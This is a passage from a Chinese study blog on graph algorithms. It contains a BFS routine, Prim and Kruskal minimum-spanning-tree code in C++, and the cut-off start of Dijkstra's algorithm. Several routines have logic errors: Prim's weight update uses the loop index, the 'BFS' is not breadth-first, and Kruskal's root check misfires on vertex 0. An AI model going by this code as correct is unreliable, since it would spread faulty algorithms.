printf(&quot;%c&quot;,amGraph-&gt;vexs[sub]);</span><br><span class="hljs-comment">    visited[sub]=1;</span><br><span class="hljs-comment">    for (int i = 0; i &lt; amGraph-&gt;vexnum; ++i) &#123;</span><br><span class="hljs-comment">        if (amGraph-&gt;arcs[sub][i]!=0&amp;&amp;visited[i]==0)&#123;</span><br><span class="hljs-comment">            DFS(amGraph,visited,i);</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">&#125;*/</span><br><br><br><span class="hljs-comment">//邻接表</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">BFS</span><span class="hljs-params">(AdjList adjList,<span class="hljs-type">int</span> ints[],<span class="hljs-type">int</span> sub)</span>&#123;<br>    <span class="hljs-keyword">if</span>(adjList[sub].vex==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(ints[sub]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,adjList[sub].vex);<br>        ints[sub]=<span class="hljs-number">1</span>;<br>    &#125;<br>    EdgeNode *moveNode=adjList[sub].firstedge;<br>    <span class="hljs-keyword">while</span>(moveNode!=<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">if</span>(ints[moveNode-&gt;adjvex]==<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,adjList[moveNode-&gt;adjvex].vex);<br>            ints[moveNode-&gt;adjvex]=<span class="hljs-number">1</span>;<br>        &#125;<br>        moveNode=moveNode-&gt;next;<br>    &#125;<br>    BFS(adjList,ints,sub+<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    AMGraph *amGraph;<span class="hljs-comment">//邻接表</span><br>    AdjList adjList=&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-comment">//邻接表的点集合，全部初始化</span><br>    <span class="hljs-type">int</span> num;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input the number of node: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;num);<br>    <span class="hljs-type">int</span>* ints = (<span class="hljs-type">int</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span> (<span class="hljs-type">int</span>)*num);<span class="hljs-comment">//在搜索中，记录是否别查看</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        *(ints+i)=<span class="hljs-number">0</span>;<br>    &#125;<br>    creatGraph(&amp;amGraph,num);<span class="hljs-comment">//创建邻接矩阵</span><br>    creatAdjacencyList(amGraph,adjList);<span class="hljs-comment">//创建邻接表</span><br>    BFS(adjList,ints,<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><br></code></pre></td></tr></table></figure><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/BFS%E7%9A%84%E7%AE%97%E6%B3%95%E6%95%88%E7%8E%87.png"></p><h4 id="两种算法的比较"><a href="#两种算法的比较" class="headerlink" title="两种算法的比较"></a>两种算法的比较</h4><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/BFS%E5%92%8CDFS%E7%9A%84%E7%AE%97%E6%B3%95%E6%95%88%E7%9B%8A%E6%AF%94%E8%BE%83.png"></p><h2 id="图的应用"><a href="#图的应用" class="headerlink" title="图的应用"></a>图的应用</h2><h3 id="最小生成树"><a href="#最小生成树" class="headerlink" title="最小生成树"></a>最小生成树</h3><ol><li><p>概念回顾</p><ul><li><p>生成树</p><p>所有的顶点，均有边连接起来，不存在回路；也就是全部顶点，部分边</p></li></ul></li><li><p>最小生成树</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91.png"></p></li><li><p>构造最小数生成树</p><ul><li><p>MST性质：设N&#x3D;(V,E)是一个连通的网，存在一个U是顶点集V的非空子集。若边（u,v）是一条具有最小权值的边，其中u包含于U,v包含于V，则一定存在一个最小生成树，包含边（u,v）</p></li><li><p><code>prim</code>普利姆算法</p><p> <img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/prim%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91%E7%AE%97%E6%B3%95.png"></p> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br>      <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100       <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br>      <br>      <br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">AMGraph</span> &#123;<br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//顶点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>    <span class="hljs-built_in">AMGraph</span>(<span class="hljs-type">int</span> vex, <span class="hljs-type">int</span> arc) : <span class="hljs-built_in">vexnum</span>(vex), <span class="hljs-built_in">arcnum</span>(arc) &#123;&#125;<br>      <br>    <span class="hljs-built_in">AMGraph</span>() : <span class="hljs-built_in">vexnum</span>(<span class="hljs-number">0</span>), <span class="hljs-built_in">arcnum</span>(<span class="hljs-number">0</span>) &#123;&#125;<br>&#125;;<br>      <br>      <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreatGraph</span><span class="hljs-params">(AMGraph &amp;amGraph, <span class="hljs-type">int</span> num)</span> </span>&#123;<br>    amGraph.vexnum = num;<br>    <span class="hljs-comment">//给节点赋值</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        amGraph.vexs[i] = i + <span class="hljs-string">&#x27;A&#x27;</span>;<br>    &#125;<br>    <span class="hljs-comment">//初始化，获得邻接矩阵</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; num; ++j) &#123;<br>            std::cin &gt;&gt; amGraph.arcs[i][j];<br>            <span class="hljs-keyword">if</span> (amGraph.arcs[i][j] != MaxInt &amp;&amp; amGraph.arcs[i][j] != <span class="hljs-number">0</span>) &#123;<br>                amGraph.arcnum++;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>      <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreatemMinimalSpanningTree</span><span class="hljs-params">(AMGraph &amp;amGraph)</span> </span>&#123;<br>    <span class="hljs-comment">//初始化</span><br>    <span class="hljs-type">int</span> minSub = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> minWeight;<br>    <span class="hljs-type">int</span> weight[MVNum]&#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> correlativeSub[MVNum]&#123;<span class="hljs-number">0</span>&#125;;<br>      <br>    <span class="hljs-comment">//将第一个点的相关的权值记录下来</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; amGraph.vexnum; ++i) &#123;<br>        weight[i] = amGraph.arcs[minSub][i];<br>    &#125;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;the begin point is: &quot;</span> &lt;&lt; amGraph.vexs[minSub] &lt;&lt; std::endl;<br>      <br>    <span class="hljs-comment">//最小生成树</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; amGraph.vexnum; ++i) &#123;<br>        minWeight = MaxInt;<br>      <br>        <span class="hljs-comment">//找到最小的值和权值，记录这个点,更新minWeight</span><br>        <span class="hljs-keyword">for</span> (j = <span class="hljs-number">1</span>; j &lt; amGraph.vexnum; ++j) &#123;<br>            <span class="hljs-keyword">if</span> (weight[j] &lt; minWeight &amp;&amp; weight[j] != <span class="hljs-number">0</span>) &#123;<br>                minWeight = weight[j];<br>                minSub = j;<br>            &#125;<br>        &#125;<br>      <br>      <br>        std::cout &lt;&lt; <span class="hljs-string">&quot;( &quot;</span> &lt;&lt; amGraph.vexs[correlativeSub[minSub]] &lt;&lt; <span class="hljs-string">&quot;  &quot;</span> &lt;&lt; amGraph.vexs[minSub] &lt;&lt; <span class="hljs-string">&quot; )   point is： &quot;</span><br>                  &lt;&lt; amGraph.vexs[minSub] &lt;&lt; <span class="hljs-string">&quot;   weight is: &quot;</span> &lt;&lt; minWeight &lt;&lt; std::endl;<br>        weight[minSub] = <span class="hljs-number">0</span>;<span class="hljs-comment">//防止再次调用</span><br>      <br>        <span class="hljs-comment">//更新weight[]</span><br>        <span class="hljs-keyword">for</span> (j = <span class="hljs-number">1</span>; j &lt; amGraph.vexnum; ++j) &#123;<br>            <span class="hljs-keyword">if</span> (weight[j] &gt; amGraph.arcs[i][j] &amp;&amp; weight[j] != <span class="hljs-number">0</span>) &#123;<br>                weight[j] = amGraph.arcs[i][j];<br>                correlativeSub[j] = minSub;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>      <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> nodeNum;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;input your nodeNum: &quot;</span>;<br>    std::cin &gt;&gt; nodeNum;<br>    AMGraph amGraph&#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">CreatGraph</span>(amGraph, nodeNum);<br>    <span class="hljs-comment">//实现最小生树</span><br>    <span class="hljs-built_in">CreatemMinimalSpanningTree</span>(amGraph);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>      <br></code></pre></td></tr></table></figure></li><li><p>克鲁斯卡尔算法</p><p> <img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E5%85%8B%E9%B2%81%E6%96%AF%E5%8D%A1%E5%B0%94%E7%AE%97%E6%B3%95.png"></p> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br>      <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100       <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br>      <br>      <br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">AMGraph</span> &#123;<br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//顶点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>    <span class="hljs-built_in">AMGraph</span>(<span class="hljs-type">int</span> vex, <span class="hljs-type">int</span> arc) : <span class="hljs-built_in">vexnum</span>(vex), <span class="hljs-built_in">arcnum</span>(arc) &#123;&#125;<br>      <br>    <span class="hljs-built_in">AMGraph</span>() : <span class="hljs-built_in">vexnum</span>(<span class="hljs-number">0</span>), <span class="hljs-built_in">arcnum</span>(<span class="hljs-number">0</span>) &#123;&#125;<br>&#125;;<br>      <br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Edge</span> &#123;<br>    <span class="hljs-type">int</span> begin;<br>    <span class="hljs-type">int</span> end;<br>    <span class="hljs-type">int</span> weight;<br>&#125;;<br>      <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreatGraph</span><span class="hljs-params">(AMGraph &amp;amGraph, <span class="hljs-type">int</span> num)</span> </span>&#123;<br>    amGraph.vexnum = num;<br>    <span class="hljs-comment">//给节点赋值</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        amGraph.vexs[i] = i + <span class="hljs-string">&#x27;A&#x27;</span>;<br>    &#125;<br>    <span class="hljs-comment">//初始化，获得邻接矩阵</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; num; ++j) &#123;<br>            std::cin &gt;&gt; amGraph.arcs[i][j];<br>            <span class="hljs-keyword">if</span> (amGraph.arcs[i][j] != MaxInt &amp;&amp; amGraph.arcs[i][j] != <span class="hljs-number">0</span>) &#123;<br>                amGraph.arcnum++;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>      <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">GetEdges</span><span class="hljs-params">(AMGraph &amp;amGraph, std::vector&lt;Edge&gt; &amp;edges)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph.vexnum; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i + <span class="hljs-number">1</span>; j &lt; amGraph.vexnum; ++j) &#123;<br>            Edge edge;<br>            edge.begin = i;<br>            edge.end = j;<br>            edge.weight = amGraph.arcs[i][j];<br>            edges.<span class="hljs-built_in">emplace_back</span>(edge);<br>        &#125;<br>    &#125;<br>      <br>    std::<span class="hljs-built_in">sort</span>(edges.<span class="hljs-built_in">begin</span>(), edges.<span class="hljs-built_in">end</span>(), [](Edge a, Edge b) &#123;<br>        <span class="hljs-keyword">return</span> a.weight &lt; b.weight;<br>    &#125;);<br>&#125;<br>      <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(std::vector&lt;<span class="hljs-type">int</span>&gt; &amp;sub, <span class="hljs-type">int</span> begin)</span> </span>&#123;<br>    <span class="hljs-keyword">while</span> (sub[begin] &gt; <span class="hljs-number">0</span>) &#123;<br>        begin = sub[begin];<span class="hljs-comment">//找到是否连成了闭环</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> begin;<br>&#125;<br>      <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreateMinimalSpanningTree</span><span class="hljs-params">(AMGraph &amp;amGraph)</span> </span>&#123;<br>    std::vector&lt;Edge&gt; edges;<br>    <span class="hljs-built_in">GetEdges</span>(amGraph, edges);<br>    <span class="hljs-function">std::vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">sub</span><span class="hljs-params">(amGraph.vexnum, <span class="hljs-number">0</span>)</span></span>;<br>      <br>    <span class="hljs-type">int</span> beginSub, endSub;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;item: edges) &#123;<br>        beginSub = <span class="hljs-built_in">find</span>(sub, item.begin);<br>        endSub = <span class="hljs-built_in">find</span>(sub, item.end);<br>        <span class="hljs-keyword">if</span> (beginSub != endSub) &#123;<br>            sub[beginSub]=endSub;<br>            std::cout &lt;&lt; <span class="hljs-string">&quot;( &quot;</span> &lt;&lt; beginSub &lt;&lt; <span class="hljs-string">&quot;  &quot;</span> &lt;&lt; endSub &lt;&lt; <span class="hljs-string">&quot; )   &quot;</span> &lt;&lt; amGraph.vexs[beginSub] &lt;&lt; <span class="hljs-string">&quot; --&gt; &quot;</span><br>                      &lt;&lt; amGraph.vexs[endSub] &lt;&lt; <span class="hljs-string">&quot;  weight: &quot;</span>&lt;&lt;item.weight&lt;&lt; std::endl;<br>        &#125;<br>    &#125;<br>&#125;<br>      <br>       <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> nodeNum;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;input your nodeNum: &quot;</span>;<br>    std::cin &gt;&gt; nodeNum;<br>    AMGraph amGraph&#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">CreatGraph</span>(amGraph, nodeNum);<br>    <span class="hljs-comment">//实现最小生树</span><br>    <span class="hljs-built_in">CreateMinimalSpanningTree</span>(amGraph);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>      <br></code></pre></td></tr></table></figure><p>最小生成树，不一定唯一</p></li></ul></li></ol><h3 id="最短路径"><a href="#最短路径" class="headerlink" title="最短路径"></a>最短路径</h3><ul><li><p>迪杰斯特拉算法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br>  <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100       <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br>  <br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">AMGraph</span> &#123;<br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//顶点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>    <span class="hljs-built_in">AMGraph</span>(<span class="hljs-type">int</span> vex, <span class="hljs-type">int</span> arc) : <span class="hljs-built_in">vexnum</span>(vex), <span class="hljs-built_in">arcnum</span>(arc) &#123;&#125;<br>  <br>    <span class="hljs-built_in">AMGraph</span>() : <span class="hljs-built_in">vexnum</span>(<span class="hljs-number">0</span>), <span class="hljs-built_in">arcnum</span>(<span class="hljs-number">0</span>) &#123;&#125;<br>&#125;;<br>  <br>  <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreatGraph</span><span class="hljs-params">(AMGraph &amp;amGraph, <span class="hljs-type">int</span> &amp;num)</span> </span>&#123;<br>    amGraph.vexnum = num;<br>    <span class="hljs-comment">//给节点赋值</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        amGraph.vexs[i] = i + <span class="hljs-string">&#x27;A&#x27;</span>;<br>    &#125;<br>    <span class="hljs-comment">//初始化，获得邻接矩阵</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; num; ++j) &#123;<br>            std::cin &gt;&gt; amGraph.arcs[i][j];<br>            <span class="hljs-keyword">if</span> (amGraph.arcs[i][j] != MaxInt &amp;&amp; amGraph.arcs[i][j] != <span class="hljs-number">0</span>) &#123;<br>                amGraph.arcnum++;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>  <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreatePairShortPath</span><span class="hljs-params">(AMGraph amGraph)</span> </span>&#123;<br>    <span class="hljs-function">std::vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">sub</span><span class="hljs-params">(amGraph.vexnum)</span></span>;    <span class="hljs-comment">//该点对应最短路径的前驱</span><br>    <span class="hljs-function">std::vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">weight</span><span class="hljs-params">(amGraph.vexnum)</span></span>; <span class="hljs-comment">//从最开始的点到各个点的路径</span><br>    <span class="hljs-function">std::vector&lt;<span class="hljs-type">bool</span>&gt; <span class="hljs-title">final</span><span class="hljs-params">(amGraph.vexnum)</span></span>;  <span class="hljs-comment">//存放是否遍历</span><br>  <br>    <span class="hljs-comment">//初始化</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph.vexnum; ++i) &#123;<br>        weight[i] = amGraph.arcs[<span class="hljs-number">0</span>][i];;<br>        sub[i] = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">final</span>[i] = <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-comment">//针对第一个点</span><br>    weight[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">final</span>[<span class="hljs-number">0</span>] = <span class="hljs-literal">true</span>;<br>  <br>    <span class="hljs-type">int</span> min = MaxInt;<br>    <span class="hljs-type">int</span> minSub = <span class="hljs-number">0</span>;<span class="hljs-comment">//存放临时的最小的路径</span><br>    <span class="hljs-comment">//最短路径</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph.vexnum; ++i) &#123;<br>        min = MaxInt;<br>        <span class="hljs-comment">//找到到旁边一个点最近的路径</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; amGraph.vexnum; ++j) &#123;<br>            <span class="hljs-keyword">if</span> (min &gt; weight[j] &amp;&amp; !<span class="hljs-keyword">final</span>[j]) &#123;<br>                min = weight[j];<br>                minSub = j;<br>            &#125;<br>        &#125;<br>  <br>        <span class="hljs-keyword">final</span>[minSub] = <span class="hljs-literal">true</span>;<br>  <br>        <span class="hljs-comment">//测试3个节点的关系</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; amGraph.vexnum; ++j) &#123;<br>            <span class="hljs-keyword">if</span> (min + amGraph.arcs[minSub][j] &lt; weight[j] &amp;&amp; !<span 